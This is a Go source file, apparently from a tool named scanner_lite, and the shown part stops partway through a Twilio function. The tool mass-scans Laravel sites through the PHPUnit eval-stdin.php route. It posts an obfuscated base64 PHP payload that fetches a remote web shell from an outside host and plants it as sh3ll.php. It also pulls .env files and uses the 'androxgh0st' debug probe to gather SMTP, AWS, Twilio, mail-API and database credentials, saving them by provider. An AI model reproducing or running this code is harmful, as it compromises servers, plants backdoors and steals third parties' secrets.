package laravel

import (
	"crypto/tls"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/megactek/scanner_lite/internals/config"
	"github.com/megactek/scanner_lite/internals/logger"
)

type LaravelScanner struct {
	logger *logger.Logger
	conf   *config.Config
	urls   []string
	paths  []string
	wg     sync.WaitGroup

	// Results counters
	vulnerable int
	bad        int
	shells     int
	smtp       int
	twillio    int
	aws        int
	paypal     int
	nexmo      int
	exotel     int
	onesignal  int
	tokbox     int
	plivo      int
	database   int

	// Mutex for thread-safe operations
	mutex sync.Mutex
}

// HTTP headers for requests
var HEADERS = map[string]string{
	"Accept":       "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
	"User-Agent":   "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
	"Content-Type": "application/x-www-form-urlencoded",
}

// AWS regions list
var AWS_REGIONS = []string{
	"us-east-1",
	"us-east-2",
	"us-west-1",
	"us-west-2",
	"af-south-1",
	"ap-east-1",
	"ap-south-1",
	"ap-northeast-1",
	"ap-northeast-2",
	"ap-northeast-3",
	"ap-southeast-1",
	"ap-southeast-2",
	"ca-central-1",
	"eu-central-1",
	"eu-west-1",
	"eu-west-2",
	"eu-west-3",
	"eu-south-1",
	"eu-north-1",
	"me-south-1",
	"sa-east-1",
}

func NewLaravelScanner(logger *logger.Logger, conf *config.Config) (*LaravelScanner, error) {
	// load paths
	paths, err := os.ReadFile("laravel_paths.txt")
	if err != nil {
		logger.Error("Failed to read laravel_paths.txt")
		// return nil, err
	}
	urlPaths := strings.Split(string(paths), "\n")
	pathList := make([]string, 0, len(urlPaths))
	for _, line := range urlPaths {
		if line = strings.TrimSpace(line); line != "" {
			pathList = append(pathList, line)
		}
	}

	// load urls
	urls, err := os.ReadFile("good_web.txt")
	if err != nil {
		logger.Error("Failed to read good_web.txt")
		return nil, err
	}
	urlList := strings.Split(string(urls), "\n")
	tempServices := make([]string, 0, len(urlList))
	for _, line := range urlList {
		if line = strings.TrimSpace(line); line != "" {
			tempServices = append(tempServices, line)
		}
	}

	// Create Results directory if it doesn't exist
	if _, err := os.Stat("Results"); os.IsNotExist(err) {
		os.Mkdir("Results", 0755)
	}

	return &LaravelScanner{
		logger: logger,
		conf:   conf,
		urls:   tempServices,
		paths:  pathList,
		wg:     sync.WaitGroup{},
	}, nil
}

func (l *LaravelScanner) scanUrl(url string) {
	// exploitPath := l.paths[0]
	if !strings.HasPrefix(url, "http") {
		url = "http://" + url
	}

	// if !strings.HasSuffix(url, exploitPath) {
	// 	url = url + exploitPath
	// }

	// l.logger.Info("Scanning URL: " + url)

	// Check for vulnerability
	l.checkVulnerability(url)
	envResponse, path, err := l.getEnvContent(url)
	if err != nil {
		// l.logger.Error("Error getting env content: " + err.Error())
		return
	}

	// Check for SMTP credentials
	l.getSMTP(envResponse, path, url)

	// Check for Twilio credentials
	l.getTwilio(envResponse, path, url)

	// Check for AWS credentials
	l.getAWS(envResponse, path, url)

	// Check for PayPal credentials
	l.getPayPal(envResponse, path, url)

	// Check for Nexmo credentials
	l.getNexmo(envResponse, path, url)

	// Check for database credentials
	l.getDatabase(envResponse, path, url)

	// Check for other API credentials
	l.getOtherAPIs(envResponse, path, url)

}

func (l *LaravelScanner) checkVulnerability(url string) {
	paths := []string{
		"/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
		"/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
		"/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
		"/laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
		"/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
		"/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
	}
	for _, path := range paths {
		client := &http.Client{
			Timeout: 5 * time.Second,
			Transport: &http.Transport{
				TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
				DisableCompression: true, MaxIdleConns: 100,
				MaxIdleConnsPerHost: 10,
				IdleConnTimeout:     30 * time.Second,
			},
		}

		// Test for PHP info vulnerability
		payload := "<?php phpinfo(); ?>"
		req, err := http.NewRequest("POST", url+path, strings.NewReader(payload))
		if err != nil {
			// l.logger.Error("Error creating request: " + err.Error())
			l.incrementBad()
			return
		}

		for key, value := range HEADERS {
			req.Header.Set(key, value)
		}

		resp, err := client.Do(req)
		if err != nil {
			// l.logger.Error("Error scanning URL: " + err.Error())
			l.incrementBad()
			return
		}
		defer resp.Body.Close()

		body, err := io.ReadAll(resp.Body)
		if err != nil {
			// l.logger.Error("Error reading response: " + err.Error())
			l.incrementBad()
			return
		}

		if strings.Contains(string(body), "phpinfo") {
			// More accurate detection of actual phpinfo output
			isRealPhpInfo := false

			// Check for common phpinfo output patterns
			phpInfoPatterns := []string{
				"<title>PHP Version",
				"<h1 class=\"p\">PHP Version",
				"PHP Version</h1>",
				"PHP License</a>",
				"PHP Extension</th>",
				"PHP Credits</a>",
				"PHP Configuration</a>",
				"PHP Core</a>",
				"<tr><td class=\"e\">System </td><td class=\"v\">",
				"<h2>PHP License</h2>",
			}

			for _, pattern := range phpInfoPatterns {
				if strings.Contains(string(body), pattern) {
					isRealPhpInfo = true
					break
				}
			}

			// Also check for PHP configuration sections that would appear in phpinfo()
			phpSections := []string{
				"PHP Variables", "Environment", "HTTP Headers",
				"PHP Core", "php.ini", "Registered PHP Streams",
				"PHP License", "PHP Extension", "PHP Credits", "PHP Configuration", "PHP Core",
			}

			if !isRealPhpInfo {
				for _, section := range phpSections {
					if strings.Contains(string(body), section) &&
						strings.Contains(string(body), "<table") &&
						strings.Contains(string(body), "<tr class=\"h\">") {
						isRealPhpInfo = true
						break
					}
				}
			}

			if isRealPhpInfo {
				l.mutex.Lock()
				l.vulnerable++
				l.mutex.Unlock()

				l.logger.Success("VULNERABLE: " + url + path)

				// Save to vulnerable.txt
				f, err := os.OpenFile("Results/vulnerable.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
				if err == nil {
					defer f.Close()
					f.WriteString(url + path + "\n")
				}

				// Try to spawn shell
				l.spawnShell(url + path)
			} else {
				// The response contains "phpinfo" but doesn't look like actual phpinfo() output
				l.incrementBad()
				l.logger.Error(url + " (false positive)")
			}
		} else {
			l.incrementBad()
			l.logger.Error(url)
		}
	}
}

func (l *LaravelScanner) spawnShell(url string) {
	client := &http.Client{
		Timeout: 5 * time.Second,
	}

	// Shell payload (base64 encoded PHP code)
	shellPayload := "<?php eval('?>'.base64_decode('PD9waHANCmZ1bmN0aW9uIGFkbWluZXIoJHVybCwgJGlzaSkgew0KCSRmcCA9IGZvcGVuKCRpc2ksICJ3Iik7DQoJJGNoID0gY3VybF9pbml0KCk7DQoJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJHVybCk7DQoJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0JJTkFSWVRSQU5TRkVSLCB0cnVlKTsNCgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOw0KCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9TU0xfVkVSSUZZUEVFUiwgZmFsc2UpOw0KCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GSUxFLCAkZnApOw0KCXJldHVybiBjdXJsX2V4ZWMoJGNoKTsNCgljdXJsX2Nsb3NlKCRjaCk7DQoJZmNsb3NlKCRmcCk7DQoJb2JfZmx1c2goKTsNCglmbHVzaCgpOw0KfQ0KaWYoYWRtaW5lcigiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3h5b3Vlei9MaW51eFNlYy9tYXN0ZXIvYmF5LnBocCIsInNoM2xsLnBocCIpKSB7DQoJZWNobyAiU3Vrc2VzIjsNCn0gZWxzZSB7DQoJZWNobyAiZmFpbCI7DQp9DQo/Pg==')); ?>"

	req, err := http.NewRequest("POST", url, strings.NewReader(shellPayload))
	if err != nil {
		l.logger.Error("Error creating shell request: " + err.Error())
		return
	}

	for key, value := range HEADERS {
		req.Header.Set(key, value)
	}

	resp, err := client.Do(req)
	if err != nil {
		l.logger.Error("Error spawning shell: " + err.Error())
		return
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		l.logger.Error("Error reading shell response: " + err.Error())
		return
	}

	if strings.Contains(string(body), "Sukses") {
		l.mutex.Lock()
		l.shells++
		l.mutex.Unlock()

		l.logger.Success("Shell spawned successfully")

		// Save shell URL to shells.txt
		shellURL := strings.Replace(url, "eval-stdin.php", "sh3ll.php", 1)
		f, err := os.OpenFile("Results/shells.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err == nil {
			defer f.Close()
			f.WriteString(shellURL + "\n")
		}
	} else {
		l.logger.Error("Failed to spawn shell")
	}
}

func (l *LaravelScanner) getEnvContent(url string) (string, string, error) {
	// Replace the exploit path with /.env
	paths := []string{
		"/.env",
		"/.env.production",
		"/.env.staging",
		"/.env.backup",
		"/.env.local",
		"/.env.old",
		"/.env.bak",
		"/.env.save"}

	for _, envURL := range paths {
		client := &http.Client{
			Timeout: 5 * time.Second,
			Transport: &http.Transport{
				TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
				DisableCompression: true, MaxIdleConns: 100,
				MaxIdleConnsPerHost: 10,
				IdleConnTimeout:     30 * time.Second,
			},
		}

		// Try to get .env file
		req, err := http.NewRequest("GET", url+envURL, nil)
		if err != nil {
			return "", "", err
		}

		for key, value := range HEADERS {
			req.Header.Set(key, value)
		}

		resp, err := client.Do(req)
		if err != nil {
			return "", "", err
		}
		defer resp.Body.Close()

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			return "", "", err
		}

		content := string(body)

		// Check if we got .env file
		if strings.Contains(content, "APP_KEY") {
			return content, "/.env", nil
		}

		// If not, try debug mode
		debugURL := strings.Replace(url+envURL, "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "", 1)

		debugReq, err := http.NewRequest("POST", debugURL, strings.NewReader("0x[]=androxgh0st"))
		if err != nil {
			return "", "", err
		}

		for key, value := range HEADERS {
			debugReq.Header.Set(key, value)
		}

		debugResp, err := client.Do(debugReq)
		if err != nil {
			return "", "", err
		}
		defer debugResp.Body.Close()

		debugBody, err := ioutil.ReadAll(debugResp.Body)
		if err != nil {
			return "", "", err
		}

		debugContent := string(debugBody)

		// Check if we got debug info
		if strings.Contains(debugContent, "<td>APP_KEY</td>") {
			return debugContent, "debug", nil
		}

		return "", "", fmt.Errorf("could not get env content")
	}
	return "", "", nil
}

func (l *LaravelScanner) getSMTP(content string, method string, url string) {

	// Check for various SMTP configuration patterns
	smtpPatterns := []struct {
		hostKey      string
		portKey      string
		userKey      string
		passKey      string
		fromKey      string
		nameKey      string
		debugHostKey string
		debugPortKey string
		debugUserKey string
		debugPassKey string
		debugFromKey string
		debugNameKey string
	}{
		// Standard Laravel mail config
		{
			hostKey:      `MAIL_HOST=(.*?)\n`,
			portKey:      `MAIL_PORT=(.*?)\n`,
			userKey:      `MAIL_USERNAME=(.*?)\n`,
			passKey:      `MAIL_PASSWORD=(.*?)\n`,
			fromKey:      `MAIL_FROM_ADDRESS=(.*?)\n`,
			nameKey:      `MAIL_FROM_NAME=(.*?)\n`,
			debugHostKey: `<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugPortKey: `<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugUserKey: `<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugPassKey: `<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugFromKey: `<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugNameKey: `<td>MAIL_FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>`,
		},
		// Alternative SMTP config
		{
			hostKey:      `SMTP_HOST=(.*?)\n`,
			portKey:      `SMTP_PORT=(.*?)\n`,
			userKey:      `SMTP_USERNAME=(.*?)\n`,
			passKey:      `SMTP_PASSWORD=(.*?)\n`,
			fromKey:      `SMTP_FROM_ADDRESS=(.*?)\n`,
			nameKey:      `SMTP_FROM_NAME=(.*?)\n`,
			debugHostKey: `<td>SMTP_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugPortKey: `<td>SMTP_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugUserKey: `<td>SMTP_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugPassKey: `<td>SMTP_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugFromKey: `<td>SMTP_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugNameKey: `<td>SMTP_FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>`,
		},
		// Email config
		{
			hostKey:      `EMAIL_HOST=(.*?)\n`,
			portKey:      `EMAIL_PORT=(.*?)\n`,
			userKey:      `EMAIL_USERNAME=(.*?)\n`,
			passKey:      `EMAIL_PASSWORD=(.*?)\n`,
			fromKey:      `EMAIL_FROM_ADDRESS=(.*?)\n`,
			nameKey:      `EMAIL_FROM_NAME=(.*?)\n`,
			debugHostKey: `<td>EMAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugPortKey: `<td>EMAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugUserKey: `<td>EMAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugPassKey: `<td>EMAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugFromKey: `<td>EMAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugNameKey: `<td>EMAIL_FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>`,
		},
		// Mailer config
		{
			hostKey:      `MAILER_HOST=(.*?)\n`,
			portKey:      `MAILER_PORT=(.*?)\n`,
			userKey:      `MAILER_USERNAME=(.*?)\n`,
			passKey:      `MAILER_PASSWORD=(.*?)\n`,
			fromKey:      `MAILER_FROM_ADDRESS=(.*?)\n`,
			nameKey:      `MAILER_FROM_NAME=(.*?)\n`,
			debugHostKey: `<td>MAILER_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugPortKey: `<td>MAILER_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugUserKey: `<td>MAILER_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugPassKey: `<td>MAILER_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugFromKey: `<td>MAILER_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>`,
			debugNameKey: `<td>MAILER_FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>`,
		},
	}

	// Additional from address patterns that might exist
	fromAddressPatterns := []struct {
		key      string
		debugKey string
	}{
		{key: `FROM_EMAIL=(.*?)\n`, debugKey: `<td>FROM_EMAIL<\/td>\s+<td><pre.*>(.*?)<\/span>`},
		{key: `FROM_ADDRESS=(.*?)\n`, debugKey: `<td>FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>`},
		{key: `SENDER_EMAIL=(.*?)\n`, debugKey: `<td>SENDER_EMAIL<\/td>\s+<td><pre.*>(.*?)<\/span>`},
		{key: `DEFAULT_FROM_EMAIL=(.*?)\n`, debugKey: `<td>DEFAULT_FROM_EMAIL<\/td>\s+<td><pre.*>(.*?)<\/span>`},
		{key: `MAIL_SENDER=(.*?)\n`, debugKey: `<td>MAIL_SENDER<\/td>\s+<td><pre.*>(.*?)<\/span>`},
		{key: `APP_EMAIL=(.*?)\n`, debugKey: `<td>APP_EMAIL<\/td>\s+<td><pre.*>(.*?)<\/span>`},
		{key: `SYSTEM_EMAIL=(.*?)\n`, debugKey: `<td>SYSTEM_EMAIL<\/td>\s+<td><pre.*>(.*?)<\/span>`},
		{key: `MAIL_EMAIL=(.*?)\n`, debugKey: `<td>MAIL_EMAIL<\/td>\s+<td><pre.*>(.*?)<\/span>`},
	}

	// Try each SMTP pattern
	for _, pattern := range smtpPatterns {
		var mailhost, mailport, mailuser, mailpass, mailfrom, fromname string

		if method == "/.env" {
			hostRegex := regexp.MustCompile(pattern.hostKey)
			portRegex := regexp.MustCompile(pattern.portKey)
			userRegex := regexp.MustCompile(pattern.userKey)
			passRegex := regexp.MustCompile(pattern.passKey)
			fromRegex := regexp.MustCompile(pattern.fromKey)
			nameRegex := regexp.MustCompile(pattern.nameKey)

			if matches := hostRegex.FindStringSubmatch(content); len(matches) > 1 {
				mailhost = matches[1]
			}
			if matches := portRegex.FindStringSubmatch(content); len(matches) > 1 {
				mailport = matches[1]
			}
			if matches := userRegex.FindStringSubmatch(content); len(matches) > 1 {
				mailuser = matches[1]
			}
			if matches := passRegex.FindStringSubmatch(content); len(matches) > 1 {
				mailpass = matches[1]
			}
			if matches := fromRegex.FindStringSubmatch(content); len(matches) > 1 {
				mailfrom = matches[1]
			}
			if matches := nameRegex.FindStringSubmatch(content); len(matches) > 1 {
				fromname = matches[1]
			}
		} else if method == "debug" {
			hostRegex := regexp.MustCompile(pattern.debugHostKey)
			portRegex := regexp.MustCompile(pattern.debugPortKey)
			userRegex := regexp.MustCompile(pattern.debugUserKey)
			passRegex := regexp.MustCompile(pattern.debugPassKey)
			fromRegex := regexp.MustCompile(pattern.debugFromKey)
			nameRegex := regexp.MustCompile(pattern.debugNameKey)

			if matches := hostRegex.FindStringSubmatch(content); len(matches) > 1 {
				mailhost = matches[1]
			}
			if matches := portRegex.FindStringSubmatch(content); len(matches) > 1 {
				mailport = matches[1]
			}
			if matches := userRegex.FindStringSubmatch(content); len(matches) > 1 {
				mailuser = matches[1]
			}
			if matches := passRegex.FindStringSubmatch(content); len(matches) > 1 {
				mailpass = matches[1]
			}
			if matches := fromRegex.FindStringSubmatch(content); len(matches) > 1 {
				mailfrom = matches[1]
			}
			if matches := nameRegex.FindStringSubmatch(content); len(matches) > 1 {
				fromname = matches[1]
			}
		}

		// If we have host but no from address, try additional patterns
		if mailhost != "" && mailfrom == "" {
			for _, fromPattern := range fromAddressPatterns {
				if method == "/.env" {
					fromRegex := regexp.MustCompile(fromPattern.key)
					if matches := fromRegex.FindStringSubmatch(content); len(matches) > 1 {
						mailfrom = matches[1]
						break
					}
				} else if method == "debug" {
					fromRegex := regexp.MustCompile(fromPattern.debugKey)
					if matches := fromRegex.FindStringSubmatch(content); len(matches) > 1 {
						mailfrom = matches[1]
						break
					}
				}
			}
		}

		// If we found SMTP credentials, process them
		if mailhost != "" && (mailuser != "" || mailpass != "") {
			// Skip if credentials are null or empty
			if (mailuser == "null" && mailpass == "null") || (mailuser == "" && mailpass == "") {
				continue
			}

			l.mutex.Lock()
			l.smtp++
			l.mutex.Unlock()

			l.logger.Success("SMTP credentials found: " + url)

			// Build the credential string
			baseURL := strings.Replace(url, "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "", 1)
			smtpInfo := fmt.Sprintf("URL: %s\nMETHOD: %s\nMAILHOST: %s\nMAILPORT: %s\nMAILUSER: %s\nMAILPASS: %s\nMAILFROM: %s\nFROMNAME: %s\n\n",
				baseURL, method, mailhost, mailport, mailuser, mailpass, mailfrom, fromname)

			// Determine provider and save to appropriate file
			l.saveSmtpByProvider(mailhost, smtpInfo)

			// We found valid SMTP credentials, no need to check other patterns
			return
		}
	}

	// Look for specific provider configurations
	l.checkSpecificProviders(content, method, url)
}

// Helper function to save SMTP credentials by provider
func (l *LaravelScanner) saveSmtpByProvider(mailhost, smtpInfo string) {
	// Map of provider keywords to file names
	providerMap := map[string]string{
		".amazonaws.com":        "smtp_aws.txt",
		"sendgrid":              "sendgrid.txt",
		"office365":             "office.txt",
		"outlook":               "office.txt",
		"1and1":                 "1and1.txt",
		"1und1":                 "1and1.txt",
		"zoho":                  "zoho.txt",
		"mandrillapp":           "mandrill.txt",
		"mailgun":               "mailgun.txt",
		"gmail":                 "gmail.txt",
		"googlemail":            "gmail.txt",
		"smtp.gmail":            "gmail.txt",
		"yahoo":                 "yahoo.txt",
		"hotmail":               "hotmail.txt",
		"smtp-relay.sendinblue": "sendinblue.txt",
		"sendinblue":            "sendinblue.txt",
		"mailjet":               "mailjet.txt",
		"smtp.mailjet":          "mailjet.txt",
		"postmark":              "postmark.txt",
		"sparkpost":             "sparkpost.txt",
		"smtp.sparkpostmail":    "sparkpost.txt",
		"smtp-relay.gmail":      "gmail.txt",
		"elasticemail":          "elasticemail.txt",
	}

	// Check for AWS SES specifically
	if strings.Contains(mailhost, ".amazonaws.com") {
		// Extract AWS region from hostname
		regionRegex := regexp.MustCompile(`email-smtp\.(.*?)\.amazonaws\.com`)
		if matches := regionRegex.FindStringSubmatch(mailhost); len(matches) > 1 {
			region := matches[1]
			f, err := os.OpenFile("Results/"+region+".txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			if err == nil {
				defer f.Close()
				f.WriteString(smtpInfo)
			}
		}
	}

	// Save to provider-specific file
	saved := false
	for keyword, filename := range providerMap {
		if strings.Contains(mailhost, keyword) {
			f, err := os.OpenFile("Results/"+filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			if err == nil {
				defer f.Close()
				f.WriteString(smtpInfo)
				saved = true
				break
			}
		}
	}

	// If no specific provider matched, save to generic file
	if !saved {
		f, err := os.OpenFile("Results/SMTP_RANDOM.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err == nil {
			defer f.Close()
			f.WriteString(smtpInfo)
		}
	}
}

// Check for specific provider configurations that might not follow standard patterns
func (l *LaravelScanner) checkSpecificProviders(content, method, url string) {
	// Check for SendGrid API key
	if strings.Contains(content, "SENDGRID_API_KEY") {
		var sendgridKey string

		if method == "/.env" {
			keyRegex := regexp.MustCompile(`SENDGRID_API_KEY=(.*?)\n`)
			if matches := keyRegex.FindStringSubmatch(content); len(matches) > 1 {
				sendgridKey = matches[1]
			}
		} else if method == "debug" {
			keyRegex := regexp.MustCompile(`<td>SENDGRID_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>`)
			if matches := keyRegex.FindStringSubmatch(content); len(matches) > 1 {
				sendgridKey = matches[1]
			}
		}

		if sendgridKey != "" && sendgridKey != "null" {
			l.mutex.Lock()
			l.smtp++
			l.mutex.Unlock()

			l.logger.Success("SendGrid API key found: " + url)

			// Build the credential string
			baseURL := strings.Replace(url, "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "", 1)
			apiInfo := fmt.Sprintf("URL: %s\nMETHOD: %s\nSENDGRID_API_KEY: %s\n\n", baseURL, method, sendgridKey)

			// Save to sendgrid.txt
			f, err := os.OpenFile("Results/sendgrid.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			if err == nil {
				defer f.Close()
				f.WriteString(apiInfo)
			}
		}
	}

	// Check for Mailgun API key
	if strings.Contains(content, "MAILGUN_SECRET") || strings.Contains(content, "MAILGUN_API_KEY") {
		var mailgunKey, mailgunDomain string

		if method == "/.env" {
			keyRegex := regexp.MustCompile(`MAILGUN_SECRET=(.*?)\n`)
			if matches := keyRegex.FindStringSubmatch(content); len(matches) > 1 {
				mailgunKey = matches[1]
			}

			if mailgunKey == "" {
				keyRegex = regexp.MustCompile(`MAILGUN_API_KEY=(.*?)\n`)
				if matches := keyRegex.FindStringSubmatch(content); len(matches) > 1 {
					mailgunKey = matches[1]
				}
			}

			domainRegex := regexp.MustCompile(`MAILGUN_DOMAIN=(.*?)\n`)
			if matches := domainRegex.FindStringSubmatch(content); len(matches) > 1 {
				mailgunDomain = matches[1]
			}
		} else if method == "debug" {
			keyRegex := regexp.MustCompile(`<td>MAILGUN_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>`)
			if matches := keyRegex.FindStringSubmatch(content); len(matches) > 1 {
				mailgunKey = matches[1]
			}

			if mailgunKey == "" {
				keyRegex = regexp.MustCompile(`<td>MAILGUN_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>`)
				if matches := keyRegex.FindStringSubmatch(content); len(matches) > 1 {
					mailgunKey = matches[1]
				}
			}

			domainRegex := regexp.MustCompile(`<td>MAILGUN_DOMAIN<\/td>\s+<td><pre.*>(.*?)<\/span>`)
			if matches := domainRegex.FindStringSubmatch(content); len(matches) > 1 {
				mailgunDomain = matches[1]
			}
		}

		if mailgunKey != "" && mailgunKey != "null" {
			l.mutex.Lock()
			l.smtp++
			l.mutex.Unlock()

			l.logger.Success("Mailgun API key found: " + url)

			// Build the credential string
			baseURL := strings.Replace(url, "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "", 1)
			apiInfo := fmt.Sprintf("URL: %s\nMETHOD: %s\nMAILGUN_API_KEY: %s\nMAILGUN_DOMAIN: %s\n\n",
				baseURL, method, mailgunKey, mailgunDomain)

			// Save to mailgun.txt
			f, err := os.OpenFile("Results/mailgun.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			if err == nil {
				defer f.Close()
				f.WriteString(apiInfo)
			}
		}
	}

	// Check for Postmark API key
	if strings.Contains(content, "POSTMARK_TOKEN") || strings.Contains(content, "POSTMARK_API_KEY") {
		var postmarkKey string

		if method == "/.env" {
			keyRegex := regexp.MustCompile(`POSTMARK_TOKEN=(.*?)\n`)
			if matches := keyRegex.FindStringSubmatch(content); len(matches) > 1 {
				postmarkKey = matches[1]
			}

			if postmarkKey == "" {
				keyRegex = regexp.MustCompile(`POSTMARK_API_KEY=(.*?)\n`)
				if matches := keyRegex.FindStringSubmatch(content); len(matches) > 1 {
					postmarkKey = matches[1]
				}
			}
		} else if method == "debug" {
			keyRegex := regexp.MustCompile(`<td>POSTMARK_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>`)
			if matches := keyRegex.FindStringSubmatch(content); len(matches) > 1 {
				postmarkKey = matches[1]
			}

			if postmarkKey == "" {
				keyRegex = regexp.MustCompile(`<td>POSTMARK_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>`)
				if matches := keyRegex.FindStringSubmatch(content); len(matches) > 1 {
					postmarkKey = matches[1]
				}
			}
		}

		if postmarkKey != "" && postmarkKey != "null" {
			l.mutex.Lock()
			l.smtp++
			l.mutex.Unlock()

			l.logger.Success("Postmark API key found: " + url)

			// Build the credential string
			baseURL := strings.Replace(url, "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "", 1)
			apiInfo := fmt.Sprintf("URL: %s\nMETHOD: %s\nPOSTMARK_API_KEY: %s\n\n", baseURL, method, postmarkKey)

			// Save to postmark.txt
			f, err := os.OpenFile("Results/postmark.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			if err == nil {
				defer f.Close()
				f.WriteString(apiInfo)
			}
		}
	}

	// Check for SparkPost API key
	if strings.Contains(content, "SPARKPOST_API_KEY") || strings.Contains(content, "SPARKPOST_SECRET") {
		var sparkpostKey string

		if method == "/.env" {
			keyRegex := regexp.MustCompile(`SPARKPOST_API_KEY=(.*?)\n`)
			if matches := keyRegex.FindStringSubmatch(content); len(matches) > 1 {
				sparkpostKey = matches[1]
			}

			if sparkpostKey == "" {
				keyRegex = regexp.MustCompile(`SPARKPOST_SECRET=(.*?)\n`)
				if matches := keyRegex.FindStringSubmatch(content); len(matches) > 1 {
					sparkpostKey = matches[1]
				}
			}
		} else if method == "debug" {
			keyRegex := regexp.MustCompile(`<td>SPARKPOST_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>`)
			if matches := keyRegex.FindStringSubmatch(content); len(matches) > 1 {
				sparkpostKey = matches[1]
			}

			if sparkpostKey == "" {
				keyRegex = regexp.MustCompile(`<td>SPARKPOST_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>`)
				if matches := keyRegex.FindStringSubmatch(content); len(matches) > 1 {
					sparkpostKey = matches[1]
				}
			}
		}

		if sparkpostKey != "" && sparkpostKey != "null" {
			l.mutex.Lock()
			l.smtp++
			l.mutex.Unlock()

			l.logger.Success("SparkPost API key found: " + url)

			// Build the credential string
			baseURL := strings.Replace(url, "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "", 1)
			apiInfo := fmt.Sprintf("URL: %s\nMETHOD: %s\nSPARKPOST_API_KEY: %s\n\n", baseURL, method, sparkpostKey)

			// Save to sparkpost.txt
			f, err := os.OpenFile("Results/sparkpost.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			if err == nil {
				defer f.Close()
				f.WriteString(apiInfo)
			}
		}
	}
}

func (l *LaravelScanner) getTwilio(content string, method string, url string) {

	if !strings.Contains(content, "TWILIO") {
		return
	}

	var accSid, accKey, sec, chatid, phone, authToken string

	if method == "/.env" {
		sidRegex := regexp.MustCompile(`TWILIO_ACCOUNT_SID=(.*?)\n`)
		keyRegex := regexp.MustCompile(`TWILIO_API_KEY=(.*?)\n`)
		secRegex := regexp.MustCompile(`TWILIO_API_SECRET=(.*?)\n`)
		chatRegex := regexp.MustCompile(`TWILIO_CHAT_SERVICE_SID=(.*?)\n`)
		phoneRegex := regexp.MustCompile(`TWILIO_NUMBER=(.*?)\n`)
		tokenRegex := regexp.MustCompile(`TWILIO_AUTH_TOKEN=(.*?)\n`)

		if matches := sidRegex.FindStringSubmatch(content); len(matches) > 1 {
